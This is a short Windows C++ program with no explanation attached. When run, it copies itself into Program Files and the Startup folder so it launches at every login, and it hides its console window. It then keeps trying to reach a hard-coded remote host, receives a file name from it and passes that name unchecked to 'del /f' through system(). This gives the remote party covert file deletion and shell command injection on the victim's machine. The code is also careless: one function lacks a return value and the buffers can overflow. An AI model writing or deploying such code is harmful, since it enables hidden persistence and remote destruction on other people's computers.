#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#pragma comment(lib,"ws2_32.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <filesystem>
#include <string>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>


namespace fs = std::filesystem;

int file_exists(char* filename) 
{
    FILE* fp;
    if ((fp = fopen(filename, "r")))
    {
        fclose(fp);
        return 1;
    }
    return 0;
    
}
int Client() 
{
    int connection_flag = 0;
    SOCKET Connection;
    do {
        //WSASTARTUP
        WSAData wsaData;
        WORD DLLVersion = MAKEWORD(2, 1);
        if (WSAStartup(DLLVersion, &wsaData) != 0) {
            std::cout << "Error WSAStartup\n" << std::endl;
            return 1;
        }
        SOCKADDR_IN addr;
        int sizeofaddr = sizeof(addr);
        addr.sin_addr.s_addr = inet_addr("192.168.20.1");
        addr.sin_port = htons(1111);
        addr.sin_family = AF_INET;

        Connection = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(Connection, (SOCKADDR*)&addr, sizeofaddr) == 0)
        {
            connection_flag = 1;
        }
    } while (connection_flag != 1);
    std::cout << "Connected\n" << std::endl;
    char command[256];
    int del_success = 0;
    while (del_success == 0) {
        recv(Connection, command, sizeof(command), NULL);
        del_success = file_exists(command);
    }
    char console_input[256];
    console_input[0] = '\0';
    strcat(console_input, "del /f ");
    strcat(console_input, command);
    system(console_input);
    closesocket(Connection);
    WSACleanup();
    Sleep(500);
}
int main(int argc, char* argv[])
{
    CopyFileA(argv[0], "C:/Program Files/Client.exe", 1);
    CopyFileA(argv[0], "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/Client.exe", 1);
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    Client();
}